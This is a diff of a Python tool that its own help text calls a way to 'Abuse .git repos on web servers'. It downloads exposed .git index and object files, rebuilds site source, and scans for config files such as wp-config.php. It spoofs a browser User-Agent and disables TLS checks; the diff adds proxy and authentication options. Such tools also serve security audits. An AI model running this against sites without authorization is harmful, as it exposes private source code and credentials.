@@ -1,4 +1,6 @@
 #!/usr/bin/env python3
+# Spacing is using tabs, not spaces as they're the most accessible
+# Set your editor (hopefully vi) to not change tabs to spaces.
 import struct
 import binascii
 import sys
@@ -16,7 +18,7 @@ import difflib
 
 def error(logstr):
 	log("error", logstr)
-	exit(1)
+	sys.exit(1)
 
 def log(facility, logstr):
 	if verbose or facility == "error":
@@ -46,21 +48,21 @@ def readindex(indexfile):
 		startent=indexfile.tell()
 		entry = {}
 		statinfo = {}
-		statinfo['ctime'] = struct.unpack(">LL", indexfile.read(8))
-		statinfo['mtime'] = struct.unpack(">LL", indexfile.read(8))
+		statinfo["ctime"] = struct.unpack(">LL", indexfile.read(8))
+		statinfo["mtime"] = struct.unpack(">LL", indexfile.read(8))
 		buffer = indexfile.read(24)
-		( statinfo['dev'], statinfo['inode'], statinfo['mode'],
-		  statinfo['uid'], statinfo['gid'], statinfo['size'] ) = \
+		( statinfo["dev"], statinfo["inode"], statinfo["mode"],
+		  statinfo["uid"], statinfo["gid"], statinfo["size"] ) = \
 		  struct.unpack(">LLLLLL", buffer)
 
-		entry['statinfo'] = statinfo
-		entry['ids'] = [binascii.hexlify(indexfile.read(20)).decode()]
-		entry['flags'] = struct.unpack(">H", indexfile.read(2))[0]
-		
-		namelength=(entry['flags'] & 0x7ff)
+		entry["statinfo"] = statinfo
+		entry["ids"] = [binascii.hexlify(indexfile.read(20)).decode()]
+		entry["flags"] = struct.unpack(">H", indexfile.read(2))[0]
+
+		namelength=(entry["flags"] & 0x7ff)
 		data = indexfile.read(namelength)
-		entry['name'] = data.decode()
-		
+		entry["name"] = data.decode()
+
 		# deal with padding
 		#indexfile.read(1)
 		#indexfile.read((8 - ((namelength + 63) % 8))%8)
@@ -70,7 +72,7 @@ def readindex(indexfile):
 
 		# Add to output list
 		entries.append(entry)
-	
+
 	# Cache a copy
 	json.dump(entries, open(indexcache, "w"))
 	return entries
@@ -86,90 +88,109 @@ def parsetree(treefile, prefix=""):
 	# Decompress the file
 	data=zlib.decompress(treefile.read())
 	# skip the header
-	ptr=data.find(b'\0')+1
+	ptr=data.find(b"\0")+1
 	while ptr < len(data):
 		# Data is file perms as nnnnnn filename \0
 		# Then 20 bytes hash
-		fheader=data[ptr:ptr+data[ptr:].find(b'\0')]
-		mode=fheader[:fheader.index(b' ')].decode()
-		name=fheader[fheader.index(b' ')+1:].decode()
-		ptr+=data[ptr:].find(b'\0')+1
+		fheader=data[ptr:ptr+data[ptr:].find(b"\0")]
+		mode=fheader[:fheader.index(b" ")].decode()
+		name=fheader[fheader.index(b" ")+1:].decode()
+		ptr+=data[ptr:].find(b"\0")+1
 		ident=binascii.hexlify(data[ptr:ptr+20]).decode()
 		ptr+=20
 
 		# Before we do anything check whether we know this file
 		try:
-			entry=next(entry for entry in entries if entry['name'] == f"{prefix}{name}")
+			entry=next(entry for entry in entries if entry["name"] == f"{prefix}{name}")
 		except StopIteration:
 			# It's not in index, add a new entry
 			entry = {}
 			statinfo = {}
-			statinfo['ctime'] = statinfo['mtime'] = 0
-			statinfo['dev'] = statinfo['inode'] = 0
-			statinfo['mode'] = statinfo['uid'] = statinfo['gid'] = 0
-			statinfo['size'] = 0
-	
-			entry['statinfo'] = statinfo
-			entry['ids'] = [ident]
-			entry['flags'] = 0
-			
-			entry['name']=f"{prefix}{name}"
-			if mode[0] != '4':
+			statinfo["ctime"] = statinfo["mtime"] = 0
+			statinfo["dev"] = statinfo["inode"] = 0
+			statinfo["mode"] = statinfo["uid"] = statinfo["gid"] = 0
+			statinfo["size"] = 0
+
+			entry["statinfo"] = statinfo
+			entry["ids"] = [ident]
+			entry["flags"] = 0
+
+			entry["name"]=f"{prefix}{name}"
+			if mode[0] != "4":
 				entries.append(entry)
 
 		# If its a directory, then it may not have changed, but its children
 		# may have, so recurse
-		if mode[0] == '4':
+		if mode[0] == "4":
 			try:
 				treefile=opencachefile(f"{objectpath}/{ident[0:2]}/{ident[2:]}")
 			except:
 				continue
 			parsetree(treefile, prefix=f"{prefix}{name}/")
 
-		if ident not in entry['ids']:
-			log("discover", f"Found new version of {entry['name']}: {ident}")	
-			entry['ids'].append(ident)
+		if ident not in entry["ids"]:
+			log("discover", f"Found new version of {entry['name']}: {ident}")
+			entry["ids"].append(ident)
 
 	return
-        
+
+# Parse a pack file
+def parsepack(packfile):
+	# First read the header
+	buffer = indexfile.read(12)
+	(ident, version, objects) = struct.unpack(">4sLL", buffer)
+	if ident != b"PACK":
+		error("Not a git pack file")
+	if version not in range(2,3):
+		error(f"Unknown version of git index file: {version}")
+
+	entries=[]
+	for i in range(0, objects):
+		# do stuff
+		print()
+
+
 # Manages a file - opens from cache or downloads to cache
 # cachepath is global, url is the full url of the file
 def opencachefile(url):
 	cacheurl=urllib.parse.urlparse(url)
-	cachename=f"{cachepath}{cacheurl.path}"	
+	cachename=f"{cachepath}{cacheurl.path}"
 	filename=os.path.basename(cachename)
 	dirname=os.path.dirname(cachename)
 	handle=None
 	if os.path.exists(f"{cachepath}{cacheurl.path}"):
 		log("cache",f"{url} found in cache")
-		# we already have the file cached - use this 
+		# we already have the file cached - use this
 		handle=open(cachename,"rb")
 	else:
 		log("cache",f"Getting {url}")
 		# make sure there's a directory
 		if not os.path.exists(dirname):
 			os.makedirs(dirname)
-	
+
 		try:
 			ssl._create_default_https_context=ssl._create_unverified_context
 			urllib.request.urlretrieve(f"{url}", filename=cachename)
 		except urllib.error.HTTPError as e:
-			raise Exception(f"Server error: {e.code}")		
+			raise Exception(f"Server error: {e.code}")
 		except urllib.error.URLError as e:
-			raise Exception(f"Couldn't connect: {e.reason}")		
+			raise Exception(f"Couldn't connect: {e.reason}")
 		else:
 			handle=open(cachename,"rb")
 
 	return handle
 
 parser = argparse.ArgumentParser(description="Abuse .git repos on web servers")
-parser.add_argument('--cache', help='Directory to cache downloaded files', nargs='?', default='.gitgrab')
-parser.add_argument('--verbose', action='store_true', help='Be verbose')
-parser.add_argument('--outdir',  help='Directory to store output', default=None)
-parser.add_argument('--url', help='base URL of site')
-parser.add_argument('--version', help='version of file', type=int, default=-1)
-parser.add_argument('action', help='Action to perform: ls, download, view')
-parser.add_argument('files', help='list of file globs', nargs='*')
+parser.add_argument("--cache", help="Directory to cache downloaded files",
+						  nargs="?", default=".gitgrab")
+parser.add_argument("--verbose", action="store_true", help="Be verbose")
+parser.add_argument("--outdir",  help="Directory to store output", default=None)
+parser.add_argument("--url", help="base URL of site")
+parser.add_argument("--version", help="version of file", type=int, default=-1)
+parser.add_argument("--authentication", help="provide authentication credentials", default="")
+parser.add_argument("--proxy", help="use a proxy", default="")
+parser.add_argument("action", help="Action to perform: ls, download, view")
+parser.add_argument("files", help="list of file globs", nargs="*")
 args=parser.parse_args()
 
 verbose=args.verbose
@@ -181,7 +202,7 @@ if urlcheck.scheme == "":
 	# no scheme assume it's https
 	url=f"https://{url}"
 	urlcheck=urllib.parse.urlparse(url)
-elif urlcheck.scheme not in ('http', 'https'):
+elif urlcheck.scheme not in ("http", "https"):
 	raise Exception(f"URL scheme not supported: {urlcheck.scheme}")
 
 if outdir == None:
@@ -195,8 +216,18 @@ if args.action == "download" and not os.path.exists(outdir):
 	os.makedirs(outdir)
 
 # set up a valid User-Agent to fool any spidering restrictions
-opener = urllib.request.build_opener()
-opener.addheaders = [('user-agent','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0')]
+proxy_support=urllib.request.ProxyHandler()
+authhandler=urllib.request.HTTPBasicAuthHandler()
+if args.proxy:
+	proxy_support = urllib.request.ProxyHandler({'http': args.proxy, 'https': args.proxy})
+if args.authentication:
+	passman = urllib.request.HTTPPasswordMgrWithDefaultRealm()
+	passman.add_password(None, args.url, args.authentication.split(':')[0], args.authentication.split(':')[1])
+	authhandler = urllib.request.HTTPBasicAuthHandler(passman)
+
+opener = urllib.request.build_opener(proxy_support, authhandler)
+
+opener.addheaders = [("user-agent","Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0")]
 urllib.request.install_opener(opener)
 
 log("main","Parsing index file")
@@ -205,16 +236,16 @@ try:
 except Exception as e:
 	error(f"Could not obtain git index file: {e.args[0]}")
 
-indexcache=f"{cachepath}/indexcache"	
+indexcache=f"{cachepath}/indexcache"
 entries=readindex(cachefile)
 
 if args.action == "ls":
 	for entry in entries:
-		versions=len(entry['ids'])
+		versions=len(entry["ids"])
 		print(f"{entry['name']}")
 		if versions > 1:
-			for number, id in enumerate(entry['ids']):
-				print(f"\tVersion {number}: {id}")
+			for number, ident in enumerate(entry["ids"]):
+				print(f"\tVersion {number}: {ident}")
 	exit(0)
 
 # Experimental scan option
@@ -225,45 +256,45 @@ if args.action == "scan":
 	gconfig.read_string(configfile)
 	if 'remote "origin"' in gconfig:
 		# We have an origin
-		origin=gconfig['remote "origin"']['url']
+		origin=gconfig['remote "origin"']["url"]
 		print(f"Repository origin: {origin}")
-	if 'user' in gconfig:
+	if "user" in gconfig:
 		print(f"User found: {gconfig['user']['name']} ({gconfig['user']['email']})")
 	# Now look at the contenst of index
 	for entry in entries:
-		if re.match('wp-config.php$', entry['name']):
+		if re.match("wp-config.php$", entry["name"]):
 			print(f"Wordpress configuration file found: {entry['name']}")
-		if re.match('configuration.php$', entry['name']):
+		if re.match("configuration.php$", entry["name"]):
 			print(f"Joomla configuration file found: {entry['name']}")
-		if re.match('web.config$', entry['name']):
+		if re.match("web.config$", entry["name"]):
 			print(f"Web.config configuration file found: {entry['name']}")
-		if re.match('Dockerfile$', entry['name']):
+		if re.match("Dockerfile$", entry["name"]):
 			print(f"Dockerfile file found: {entry['name']}")
-		if re.match('.htaccess$', entry['name']):
+		if re.match(".htaccess$", entry["name"]):
 			print(f".htaccess file found: {entry['name']}")
-		if re.match('.DS_store$', entry['name']):
+		if re.match(".DS_store$", entry["name"]):
 			print(f".DS_store file found: {entry['name']}")
-		if re.match('sites/default/settings.php$', entry['name']):
+		if re.match("sites/default/settings.php$", entry["name"]):
 			print(f"Drupal configuration file found: {entry['name']}")
-		if re.match('sites/default/db_url.inc$', entry['name']):
+		if re.match("sites/default/db_url.inc$", entry["name"]):
 			print(f"Drupal database configuration file found: {entry['name']}")
 
 	# Any other files
-	req=urllib.request.Request(f"{url}/.git/objects/", method='HEAD')
+	req=urllib.request.Request(f"{url}/.git/objects/", method="HEAD")
 	accessible=True
 	try:
 		response=urllib.request.urlopen(req)
 	except urllib.error.HTTPError as e:
-		accessible=False	
+		accessible=False
 	if accessible:
 		print("Can browse the /.git/objects/ directory")
 
-	req=urllib.request.Request(f"{url}/.git/objects/pack/", method='HEAD')
+	req=urllib.request.Request(f"{url}/.git/objects/pack/", method="HEAD")
 	accessible=True
 	try:
 		response=urllib.request.urlopen(req)
 	except urllib.error.HTTPError as e:
-		accessible=False	
+		accessible=False
 	if accessible:
 		print("Can browse the /.git/objects/pack/ directory")
 
@@ -285,14 +316,14 @@ if args.action == "discover":
 		# We'll be using the branch name - regular expressions to the rescue
 		m=re.match(r'branch "(.*)"', branch)
 		bname=m[1]
-		log("discover",f"Searching branch {bname}")	
+		log("discover",f"Searching branch {bname}")
 		try:
 			if bname == "/HEAD":
 				hfile=opencachefile(f"{url}/.git{bname}").read().decode().rstrip("\n")
 				cfile=opencachefile(f"{url}/.git/{hfile[5:]}").read().decode().rstrip("\n")
 			elif bname == "/ORIG_HEAD":
 				cfile=opencachefile(f"{url}/.git{bname}").read().decode().rstrip("\n")
-			else:		
+			else:
 				fname=f"{url}/.git/refs/remotes/origin/{bname}"
 				cfile=opencachefile(fname).read().decode().rstrip("\n")
 		except:
@@ -310,11 +341,11 @@ if args.action == "discover":
 				(commit, parent) = parsecommit(opencachefile(f"{objectpath}/{parent[0:2]}/{parent[2:]}"))
 			except:
 				break
-	
+
 	# Save the updated entries
 	json.dump(entries, open(indexcache, "w"))
 	exit(0)
-	
+
 if args.action == "diff":
 	if len(args.files)<3:
 		error("Syntax: diff file version1 version2")
@@ -323,12 +354,12 @@ if args.action == "diff":
 	vers2=int(args.files[2])
 
 	try:
-		entry=next(entry for entry in entries if entry['name'] == dfile)
+		entry=next(entry for entry in entries if entry["name"] == dfile)
 	except StopIteration:
 		error(f"File {dfile} doesn't exists in index")
 
-	if vers1 > (len(entry['ids']) - 1): error(f"Version {vers1} does not exist")
-	if vers2 > (len(entry['ids']) - 1): error(f"Version {vers2} does not exist")
+	if vers1 > (len(entry["ids"]) - 1): error(f"Version {vers1} does not exist")
+	if vers2 > (len(entry["ids"]) - 1): error(f"Version {vers2} does not exist")
 	if vers1 == vers2: error(f"Cannot diff the same version")
 
 	log("diff","Obtaining files")
@@ -339,7 +370,7 @@ if args.action == "diff":
 		thisfile=opencachefile(f"{url}/.git/objects/{first}/{rest}")
 		# Now we have it we can compress the data (!)
 		raw=zlib.decompress(thisfile.read())
-		firstfile=raw[raw.find(b'\0')+1:].decode()
+		firstfile=raw[raw.find(b"\0")+1:].decode()
 	except Exception as e:
 		error(f"Could not obtain git object file for {dfile}: {e.args[0]}")
 
@@ -350,7 +381,7 @@ if args.action == "diff":
 		thisfile=opencachefile(f"{url}/.git/objects/{first}/{rest}")
 		# Now we have it we can compress the data (!)
 		raw=zlib.decompress(thisfile.read())
-		secondfile=raw[raw.find(b'\0')+1:].decode()
+		secondfile=raw[raw.find(b"\0")+1:].decode()
 	except Exception as e:
 		error(f"Could not obtain git object file for {dfile}: {e.args[0]}")
 
@@ -380,9 +411,9 @@ if args.action == "download" or args.action == "view":
 	files=set()
 	params=args.files
 	if params==[]:
-		params=['*']
+		params=["*"]
 	for file in params:
-		outputfiles=fnmatch.filter([x['name'] for x in entries], file)
+		outputfiles=fnmatch.filter([x["name"] for x in entries], file)
 		files=set().union(files,outputfiles)
 	if files == set():
 		print(f"No files matched the provided globs: {params}")
@@ -391,11 +422,11 @@ if args.action == "download" or args.action == "view":
 
 	for file in files:
 		# Get entry from entries
-		entry=next(entry for entry in entries if entry['name'] == file)
+		entry=next(entry for entry in entries if entry["name"] == file)
 		versions=entry["ids"]
 		if args.version > -1:
 			versions=[]
-			if args.version < len(entry["ids"]): 
+			if args.version < len(entry["ids"]):
 				versions.append(entry["ids"][args.version])
 			else:
 				log("error",f"Version {args.version} does not exist for file {file}")
@@ -420,14 +451,14 @@ if args.action == "download" or args.action == "view":
 				if not os.path.exists(os.path.dirname(outfile)):
 					os.makedirs(os.path.dirname(outfile))
 				output=open(outfile,"wb")
-				type=decompressed[:5].decode()
-				data=decompressed[decompressed.find(b'\0')+1:]
+				filetype=decompressed[:5].decode()
+				data=decompressed[decompressed.find(b"\0")+1:]
 				output.write(data)
 				output.close()
 			else:
-				data=decompressed[decompressed.find(b'\0')+1:].decode()
+				data=decompressed[decompressed.find(b"\0")+1:].decode()
 				print(data)
 	exit(0)
 
-print(f"Unknown command: {args.action}") 
+print(f"Unknown command: {args.action}")
 
